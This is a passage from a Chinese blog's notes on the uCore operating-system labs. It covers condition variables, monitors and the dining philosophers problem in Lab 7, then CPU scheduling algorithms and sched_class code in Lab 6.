<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unlock one of threads waiting on the condition variable.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cond_signal</span> <span class="params">(<span class="keyword">condvar_t</span> *cvp)</span> </span>&#123;</span><br><span class="line">   <span class="comment">//LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">   cprintf(<span class="string">"cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);  </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   *      cond_signal(cv) &#123;</span></span><br><span class="line"><span class="comment">   *          if(cv.count&gt;0) &#123;</span></span><br><span class="line"><span class="comment">   *             mt.next_count ++;</span></span><br><span class="line"><span class="comment">   *             signal(cv.sem);</span></span><br><span class="line"><span class="comment">   *             wait(mt.next);</span></span><br><span class="line"><span class="comment">   *             mt.next_count--;</span></span><br><span class="line"><span class="comment"> *          &#125;</span></span><br><span class="line"><span class="comment">   *       &#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    <span class="keyword">if</span>(cvp-&gt;count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        cvp-&gt;owner-&gt;next_count ++;</span><br><span class="line">        up(&amp;(cvp-&gt;sem));</span><br><span class="line">        down(&amp;(cvp-&gt;owner-&gt;next));</span><br><span class="line">        cvp-&gt;owner-&gt;next_count --;</span><br><span class="line">   &#125;</span><br><span class="line">   cprintf(<span class="string">"cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当某个线程需要等待锁时，则会执行<code>cond_wait</code>函数。而该函数是我们这次要实现的函数之一。</p>
<ul>
<li>
<p>当某个线程因为等待条件变量而<strong>准备</strong>将<strong>自身挂起</strong>前，此时条件变量中的<code>count</code>变量应自增1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cvp-&gt;count++;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后当前进程应该释放<strong>所等待的条件变量所属的管程互斥锁</strong>，以便于让其他线程执行管程代码。</p>
<p>但如果存在一个已经在管程中、但因为执行<code>cond_signal</code>而挂起的线程，则优先继续执行该线程。</p>
<blockquote>
<p>有关“因为执行<code>cond_signal</code>而挂起的线程”的详细信息，请阅读上方<code>cond_signal</code>函数的介绍来了解。</p>
</blockquote>
<p>如果程序选择执行<code>up(&amp;(cvp-&gt;owner-&gt;next))</code>，请注意：<strong>此时mutex没有被释放</strong>。因为当前线程将被挂起，原先存在于管程中的线程被唤醒，此时管程中仍然只有一个活跃线程，不需要让新的线程进入管程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="number">0</span>)</span><br><span class="line">    up(&amp;(cvp-&gt;owner-&gt;next));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    up(&amp;(cvp-&gt;owner-&gt;mutex));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>释放管程后，尝试获取该条件变量。如果获取失败，则当前线程将在<code>down</code>函数的内部被挂起。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">down(&amp;(cvp-&gt;sem));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>若当前线程成功获取条件变量，则当前等待条件变量的线程数减一。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cvp-&gt;count--;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>这样就结束了吗？想想看为什么当线程成功获取条件变量时，<strong>不重新申请管程的互斥锁</strong>。</p>
<p>以下是一个简单的流程：线程1执行wait被挂起，释放管程的mutex，之后线程2获取mutex并进入管程，然后执行了signal唤醒线程1，同时挂起自身。在这个过程中，管程中自始自终都只存在一个活跃线程（原先的线程1执行，线程2未进入，到线程1挂起，线程2进入，再到线程1被唤醒，线程2挂起）。而此时mutex在线程1被唤醒前就已被线程2所获取，<strong>新线程无法进入管程</strong>，因此被唤醒的线程1不需要再次获取mutex。由于管程锁已被获取（<strong>不管是哪个线程获取</strong>）、管程中只有一个活跃线程，因此我们可以<strong>近似将管程锁视为是当前线程获取的</strong>。</p>
</blockquote>
<p>以下是最终代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Suspend calling thread on a condition variable waiting for condition Atomically unlocks</span></span><br><span class="line"><span class="comment">// mutex and suspends calling thread on conditional variable after waking up locks mutex. Notice: mp is mutex semaphore for monitor's procedures</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">cond_wait (<span class="keyword">condvar_t</span> *cvp) &#123;</span><br><span class="line">    <span class="comment">//LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">    cprintf(<span class="string">"cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *         cv.count ++;</span></span><br><span class="line"><span class="comment">    *         if(mt.next_count&gt;0)</span></span><br><span class="line"><span class="comment">    *            signal(mt.next)</span></span><br><span class="line"><span class="comment">    *         else</span></span><br><span class="line"><span class="comment">    *            signal(mt.mutex);</span></span><br><span class="line"><span class="comment">    *         wait(cv.sem);</span></span><br><span class="line"><span class="comment">    *         cv.count --;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    cvp-&gt;count++;</span><br><span class="line">    <span class="keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="number">0</span>)</span><br><span class="line">        up(&amp;(cvp-&gt;owner-&gt;next));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        up(&amp;(cvp-&gt;owner-&gt;mutex));</span><br><span class="line">    down(&amp;(cvp-&gt;sem));</span><br><span class="line">    cvp-&gt;count--;</span><br><span class="line"></span><br><span class="line">    cprintf(<span class="string">"cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>管程中函数的入口出口设计</p>
<ul>
<li>
<p>为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作，即：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">monitorFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));</span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">      <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">         up(&amp;(mtp-&gt;next));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这样做的好处有两个</p>
<ul>
<li>只有一个进程在执行管程中的函数。</li>
<li>避免由于执行了<code>cond_signal</code>函数而睡眠的进程无法被唤醒。</li>
</ul>
</li>
<li>
<p>针对 <strong>“避免由于执行了<code>cond_signal</code>函数而睡眠的进程无法被唤醒“</strong> 这个优点简单说一下</p>
<ul>
<li>管程中<code>wait</code>和<code>signal</code>函数的调用存在时间顺序。例如：当线程1先调用<code>signal</code>唤醒线程2并将自身线程挂起后，线程2在开始执行时将无法唤醒原先的在<code>signal</code>中挂起的线程1。</li>
<li>也就是说，<strong>只要存在线程在管程中执行了<code>signal</code>，那么至少存在一个线程在管程中被挂起</strong>。</li>
<li>此时，就只能在临界区外唤醒挂起的线程1，而这一步在代码中也得到了实现。</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<ol start="2">
<li>用管程机制实现哲学家就餐问题的解决方案（基于条件变量）</li>
</ol>
</blockquote>
<ul>
<li>
<p>这题涉及到了两个函数，分别是<code>phi_take_forks_condvar</code>和<code>phi_put_forks_condvar</code>。与信号量所实现的哲学家就餐问题类似，大体逻辑是一致的。</p>
</li>
<li>
<p>首先，哲学家需要尝试获取刀叉，如果刀叉没有获取到，则等待刀叉。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));</span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">     <span class="comment">// LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">     <span class="comment">// I am hungry</span></span><br><span class="line">     state_condvar[i]=HUNGRY; <span class="comment">/* 记录下哲学家i饥饿的事实 */</span></span><br><span class="line">     <span class="comment">// try to get fork</span></span><br><span class="line">     phi_test_condvar(i);</span><br><span class="line">     <span class="keyword">if</span> (state_condvar[i] != EATING) &#123;</span><br><span class="line">          cprintf(<span class="string">"phi_take_forks_condvar: %d didn't get fork and will wait\n"</span>,i);</span><br><span class="line">          cond_wait(&amp;mtp-&gt;cv[i]);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">      <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">         up(&amp;(mtp-&gt;next));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后，当哲学家放下刀叉时，如果左右两边的哲学家都满足条件可以进餐，则设置对应的条件变量。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));</span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">     <span class="comment">// LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">     <span class="comment">// I ate over</span></span><br><span class="line">     state_condvar[i]=THINKING; <span class="comment">/* 哲学家进餐结束 */</span></span><br><span class="line">     <span class="comment">// test left and right neighbors</span></span><br><span class="line">     phi_test_condvar(LEFT); <span class="comment">/* 看一下左邻居现在是否能进餐 */</span></span><br><span class="line">     phi_test_condvar(RIGHT); <span class="comment">/* 看一下右邻居现在是否能进餐 */</span></span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">     <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">        up(&amp;(mtp-&gt;next));</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下是哲学家尝试进餐的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_condvar</span> <span class="params">(i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;</span><br><span class="line">        cprintf(<span class="string">"phi_test_condvar: state_condvar[%d] will eating\n"</span>,i);</span><br><span class="line">        state_condvar[i] = EATING ;</span><br><span class="line">        cprintf(<span class="string">"phi_test_condvar: signal self_cv[%d] \n"</span>,i);</span><br><span class="line">        cond_signal(&amp;mtp-&gt;cv[i]) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="扩展练习">扩展练习</h3>
<h4 id="Challenge-1">Challenge 1</h4>
<blockquote>
<p>在ucore中实现简化的死锁和重入探测机制.</p>
</blockquote>
<blockquote>
<p>在ucore下实现一种探测机制，能够在多进程/线程运行同步互斥问题时，动态判断当前系统是否出现了死锁产生的必要条件，是否产生了多个进程进入临界区的情况。 如果发现，让系统进入monitor状态，打印出你的探测信息。</p>
</blockquote>
<p>死锁的相关资料可查阅上文中的<a href="#7-%E6%AD%BB%E9%94%81">死锁</a>来了解。</p>
<blockquote>
<p>具体实现暂鸽。</p>
</blockquote>
<h4 id="Challenge-2">Challenge 2</h4>
<blockquote>
<p>在ucore下实现下Linux的RCU同步互斥机制。</p>
</blockquote>
<p>RCU(Read-Copy Update) 机制适用于读者-写者模型，但更适用于<strong>读者多而写者少</strong>的情况，因为其行为方式如下：</p>
<ul>
<li>
<p><strong>随时可以拿到读锁，在有些设计中甚至不需要锁</strong>，即对临界区的读操作随时都可以得到满足，不能被阻塞。因此读者几乎没有什么同步开销。</p>
</li>
<li>
<p>某一时刻只能有一个人拿到写锁，<strong>多个写锁需要互斥</strong>，写的动作包括 拷贝–修改–宽限窗口到期后删除原值。写者在访问它时首先<strong>拷贝</strong>一个副本，然后对副本进行修改，最后使用一个回调（callback）机制在适当的时机把指向原来数据的指针重新指向新的被修改的数据。这个时机就是所有引用该数据的CPU都退出对共享数据的操作。</p>
<blockquote>
<p>RCU保护的是指针，这一点尤其重要。因为指针赋值是一条单指令，也就是说是一个原子操作。更改指针指向时没必要考虑它的同步，只需要考虑cache的影响.。</p>
</blockquote>
</li>
<li>
<p>临界区的原始值为m1，如果存在线程拿到写锁修改了临界区为m2,则在写锁修改临界区<strong>之后</strong>，如果某个线程拿到了读锁，则获取的临界区的值应该为m2；写锁修改临界区<strong>之前</strong>，读锁获取的值应为m1。这样的操作通过原子操作来保证。</p>
</li>
<li>
<p>RCU读操作随时都会得到满足，但写锁之后的写操作所耗费的系统资源就相对比较多了，因为需要延迟数据结构的释放与复制被修改的数据结构，并且只有在宽限期之后才会彻底删除原资源。</p>
<blockquote>
<p>当一个线程执行删除某个结点的动作后，该结点并不会马上被删除，而是等待所有读取线程全部读取完成后才进行销毁操作，而这样做的原因是这些线程有可能读到了要删除的元素。</p>
<p>从删除结点到销毁节点这之间的过程，称为<strong>宽限期</strong>（Grace Period）</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>具体实现暂鸽QwQ</p>
</blockquote>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab6</title>
    <url>/2020/09/uCore-6/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 6时写下的一些笔记</li>
<li>内容涉及处理机调度的一些相关实现。</li>
</ul>
<a id="more"></a>
<h2 id="知识点">知识点</h2>
<h3 id="1-CPU资源的时分复用">1. CPU资源的时分复用</h3>
<ul>
<li>进程切换：CPU资源的当前占用者切换
<ul>
<li>保存当前进程在PCB中的执行上下文（CPU状态）</li>
<li>恢复下一个进程的执行上下文</li>
</ul>
</li>
<li>处理机调度
<ul>
<li>从就绪队列中<strong>挑选</strong>下一个占用CPU运行的进程。</li>
<li>从多个可用CPU中<strong>挑选</strong>就绪进程可使用的CPU资源。</li>
</ul>
</li>
<li>调度程序：挑选就绪进程的内核函数
<ul>
<li>调度策略：依据什么原理挑选进程/线程</li>
<li>调度时机：什么时候进行调度
<ul>
<li>内核运行调度程序的条件
<ul>
<li>进程从运行状态切换到等待状态</li>
<li>进程被终结了</li>
</ul>
</li>
<li>非抢占系统：当前进程主动放弃CPU时</li>
<li>可抢占系统
<ul>
<li>中断请求被服务例程响应完成时</li>
<li>当前进程被抢占
<ul>
<li>进程的时间片耗尽</li>
<li>进程从等待状态切换到就绪状态</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-调度准则">2. 调度准则</h3>
<ul>
<li>
<p>比较调度算法的准则</p>
<ul>
<li>CPU使用率：CPU处于忙状态的<strong>时间百分比</strong></li>
<li>吞吐量：单位时间内完成的<strong>进程数量</strong></li>
<li>周转时间：进程从初始化到结束（包括等待）的<strong>总时间</strong></li>
<li>等待时间：进程在就绪队列中的<strong>总时间</strong></li>
<li>响应时间：从提交请求到产生响应所花费的<strong>总时间</strong></li>
</ul>
</li>
<li>
<p>调度策略的目标</p>
<ul>
<li><strong>减少响应时间</strong>：及时处理用户的输入，尽快将输出反馈给用户</li>
<li><strong>减少平均响应时间的波动</strong>：在交互系统中，可预测性比高差异低平均更重要。</li>
</ul>
<blockquote>
<p>低延迟调度改善用户的交互体验。</p>
<p>响应时间是操作系统的计算延迟。</p>
</blockquote>
</li>
<li>
<p>调度策略的吞吐量目标</p>
<ul>
<li><strong>增加吞吐量</strong>
<ul>
<li>减小开销（例如上下文切换的开销）</li>
<li>系统资源的高效利用（例如CPU和IO设备的并行使用）</li>
</ul>
</li>
<li><strong>减少每个进程的等待时间</strong></li>
<li>保证<strong>吞吐量不受用户交互的影响</strong></li>
</ul>
<blockquote>
<p>吞吐量是操作系统的计算带宽。</p>
</blockquote>
</li>
<li>
<p>调度的公平性目标</p>
<ul>
<li>保证每个进程<strong>占用相同的CPU时间</strong></li>
<li>保证每个进程的<strong>等待时间</strong>相同</li>
<li>公平通常会增加<strong>平均响应时间</strong></li>
</ul>
</li>
</ul>
<h3 id="3-调度算法">3. 调度算法</h3>
<h4 id="a-先来先服务算法（First-Come-First-Served-FCFS）">a. 先来先服务算法（First Come First Served, FCFS）</h4>
<blockquote>
<p>依据进程进入就绪状态的先后顺序排序</p>
</blockquote>
<ul>
<li>优点：简单</li>
<li>缺点：
<ul>
<li>
<p>平均等待时间波动较大（短进程可能排在长进程后面）</p>
</li>
<li>
<p>IO资源和CPU资源的利用效率可能较低</p>
<blockquote>
<p>CPU密集型进程会导致IO设备闲置时，IO密集型进程也在等待。（CPU和IO设备可并行执行）</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="b-短进程优先算法（SPN）">b. 短进程优先算法（SPN）</h4>
<blockquote>
<p>选择就绪队列中执行时间<strong>最短</strong>进程占用的CPU进入运行状态。就绪队列按预期的执行时间来排序。</p>
</blockquote>
<ul>
<li>优点：短进程优先算法具有<strong>最优</strong>平均周转时间。</li>
<li>缺点：
<ul>
<li>
<p>可能导致<strong>饥饿</strong>。例如连续的短进程流会使长进程无法获得CPU资源。</p>
</li>
<li>
<p><strong>需要预估下一个CPU计算的持续时间</strong></p>
<blockquote>
<p>一种方法是，用<strong>历史</strong>执行时间预估<strong>未来</strong>执行时间</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>短剩余时间优先算法（SRT）：SPN算法的可抢占改进</p>
</blockquote>
<h4 id="c-最高响应比优先算法（HRRN）">c. 最高响应比优先算法（HRRN）</h4>
<blockquote>
<p>选择就绪队列中响应比R值最高的进程</p>
<p>其中$R=(w+s)/s$, s：执行时间；w：等待时间</p>
</blockquote>
<ul>
<li>在短进程优先算法基础上的改进</li>
<li>不可抢占</li>
<li>关注进程的等待时间</li>
<li>防止无限期推迟</li>
</ul>
<h4 id="d-时间片轮转算法（RR，Round-Robin）">d. 时间片轮转算法（RR，Round-Robin）</h4>
<ul>
<li>时间片：分配处理机资源的基本时间单位</li>
<li>算法思路：
<ul>
<li>时间片结束时，按FCFS算法切换到下一个就绪进程。</li>
<li>每隔n-1个时间片，进程执行一个时间片。</li>
</ul>
</li>
<li>时间片长度选择
<ul>
<li>时间片长度过长，则<strong>等待时间太长</strong>，极端情况下退化成FCFS。</li>
<li>时间片长度过短，则<strong>反应较为迅速</strong>，但产生大量进程上下文切换，影响系统吞吐量。</li>
<li>需要选择一个合适的时间片长度，以维持上下文切换开销处于1%状态。</li>
</ul>
</li>
</ul>
<h4 id="e-多级队列调度算法（MQ）">e. 多级队列调度算法（MQ）</h4>
<ul>
<li>就绪队列被划分为多个独立的子队列，每个队列拥有自己的调度策略</li>
<li>队列间的调度
<ul>
<li>
<p>固定优先级。例如先处理前台，后处理后台。但可能会导致饥饿。</p>
</li>
<li>
<p>时间片轮转。每个队列都得到一个确定的能够调度其进程的CPU总时间。</p>
<blockquote>
<p>例如80%CPU时间用于前台，20%CPU时间用于后台。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="f-多级反馈队列算法（MLFQ）">f. 多级反馈队列算法（MLFQ）</h4>
<ul>
<li>
<p>进程可在不同队列间移动的多级队列算法。</p>
<blockquote>
<p>时间片大小随优先级级别的增加而增加。</p>
<p>例如进程在当前时间片内没有完成，则降到下一个优先级。</p>
</blockquote>
</li>
<li>
<p>特征：CPU密集型进程优先级下降的很快，IO密集型进程停留在高优先级。</p>
</li>
</ul>
<h4 id="g-公平共享调度（FSS-Fair-Share-Scheduling）">g. 公平共享调度（FSS, Fair Share Scheduling）</h4>
<p>FSS控制用户对系统资源的访问</p>
<ul>
<li>一些用户组比其他用户组更重要。</li>
<li>保证不重要的组无法垄断资源
<ul>
<li>未使用的资源按比例分配</li>
<li>没有达到资源使用率目标的组获得更高的优先级。</li>
</ul>
</li>
</ul>
<h3 id="4-实时操作系统">4. 实时操作系统</h3>
<ul>
<li>实时操作系统的定义：正确性依赖于其时间和功能两方面的操作系统</li>
<li>实时操作系统的性能指标：
<ul>
<li>时间约束的及时性（deadline）</li>
<li>速度和平均性能相对不重要</li>
</ul>
</li>
<li>实时操作系统的特性：时间约束的<strong>可预测性</strong></li>
<li>实时任务：
<ul>
<li>任务：一次计算/文件读取/信息传递等等。</li>
<li>任务属性：完成任务所需的资源以及定时参数。</li>
</ul>
</li>
<li>周期实时任务：一系列相似的任务
<ul>
<li>任务有规律的重复</li>
<li>周期p = 任务请求间隔$(0&lt;p)$</li>
<li>执行时间e = 最大执行时间$(0&lt; e &lt;p)$</li>
<li>使用率$U = e/p$</li>
</ul>
</li>
<li>软时限和硬时限
<ul>
<li>硬时限（hard deadline）
<ul>
<li>错过任务时限将会导致<strong>灾难性或非常严重的后果</strong></li>
<li><strong>必须</strong>验证，在最坏的情况下能够满足时限</li>
</ul>
</li>
<li>软时限（soft deadline）
<ul>
<li><strong>通常</strong>能满足任务时限。如有时不能满足，则降低要求</li>
<li>尽力保证满足任务时限。</li>
</ul>
</li>
</ul>
</li>
<li>实时调度
<ul>
<li>速率单调调度算法（RM, Rate Monotonic）
<ul>
<li>通过周期安排优先级</li>
<li>周期越短优先级越高</li>
<li>执行周期越短的任务。</li>
</ul>
</li>
<li>最早截止时间优先算法（EDF，Earliest Deadline First）
<ul>
<li>截止时间越早优先级越高</li>
<li>执行截止时间最早的任务</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-多处理器调度">5. 多处理器调度</h3>
<ul>
<li>多处理器调度的特征
<ul>
<li>多个处理机组成一个多处理系统</li>
<li>处理机间可负载共享</li>
</ul>
</li>
<li>对称多处理器（SMP，Symmetric multiprocessing）调度
<ul>
<li>每个处理器运行自己的调度程序</li>
<li>调度程序对共享资源的访问需要进行同步</li>
</ul>
</li>
<li>对称多处理器的进程分配
<ul>
<li>静态进程分配
<ul>
<li>进程从开始到结束都被分配到一个固定的处理机上执行</li>
<li>每个处理机都有自己的就绪队列</li>
<li>调度开销小</li>
<li>各处理机可能忙闲不均（例如<em>一核工作，七核在看</em> XD）</li>
</ul>
</li>
<li>动态进程分配
<ul>
<li>进程在执行中可分配到任意空闲处理机执行</li>
<li>所有处理机共享一个公共的就绪队列</li>
<li>调度开销大</li>
<li>各处理机的负载是均衡的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-优先级反置">6. 优先级反置</h3>
<blockquote>
<p>优先级反置（Priority Inversion），是操作系统中出现的<strong>高优先级进程</strong>长时间等待<strong>低优先级进程</strong>所<strong>占用的资源</strong>的现象。</p>
<p>基于优先级的可抢占调度算法存在优先级反置。</p>
</blockquote>
<ul>
<li>优先级继承（Priority Inheritance）
<ul>
<li>占用资源的<strong>低优先级</strong>进程<strong>继承</strong>申请资源的<strong>高优先级</strong>进程的优先级。</li>
<li>只在占有资源的低优先级进程<strong>被阻塞时</strong>，才提高占有资源进程的优先级。</li>
</ul>
</li>
<li>优先级天花板协议（Priority ceiling protocol）
<ul>
<li>占用资源进程的优先级和所有可能的申请该资源的进程的最高优先级相同。</li>
<li>不管是否发生等待，都提升占用资源进程的优先级。</li>
<li>优先级高于系统中所有被锁定的资源的优先级上限，任务执行临界区时就不会被阻塞。</li>
</ul>
</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="0-练习0">0) 练习0</h3>
<blockquote>
<p>填写已有实验</p>
</blockquote>
<p>先将Lab5中的相关代码照搬过来，然后修改<code>alloc_proc</code>的初始化，以及系统中断里的<strong>时钟中断</strong>这两处即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct * <span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;state = PROC_UNINIT;</span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">        <span class="comment">// Lab5 code</span></span><br><span class="line">        proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// Lab6 新增code</span></span><br><span class="line">        proc-&gt;rq = <span class="literal">NULL</span>;</span><br><span class="line">        list_init(&amp;(proc-&gt;run_link));</span><br><span class="line">        proc-&gt;time_slice = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right = proc-&gt;lab6_run_pool.parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;lab6_stride = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;lab6_priority = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">    ticks++;</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line">    sched_class_proc_tick(current);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<h3 id="1-练习1">1) 练习1</h3>
<blockquote>
<p>使用 Round Robin 调度算法（不需要编码）</p>
</blockquote>
<ul>
<li>
<p>请理解并分析sched_class中各个函数指针的用法，并结合Round Robin 调度算法描ucore的调度执行过程</p>
<ul>
<li><code>sched_class</code>中各个函数指针的用法
<ul>
<li>
<p><code>sched_class</code>的定义如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the</span></span><br><span class="line"><span class="comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate</span></span><br><span class="line"><span class="comment">// the scheduling policies.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> &#123;</span></span><br><span class="line">    <span class="comment">// the name of sched_class</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="comment">// Init the run queue</span></span><br><span class="line">    <span class="keyword">void</span> (*init)(struct run_queue *rq);</span><br><span class="line">    <span class="comment">// put the proc into runqueue, and this function must be called with rq_lock</span></span><br><span class="line">    <span class="keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">// get the proc out runqueue, and this function must be called with rq_lock</span></span><br><span class="line">    <span class="keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">// choose the next runnable task</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *(*<span class="title">pick_next</span>)(<span class="title">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>);</span></span><br><span class="line">    <span class="comment">// dealer of the time-tick</span></span><br><span class="line">    <span class="keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);</span><br><span class="line">    <span class="comment">/* for SMP support in the future</span></span><br><span class="line"><span class="comment">     *  load_balance</span></span><br><span class="line"><span 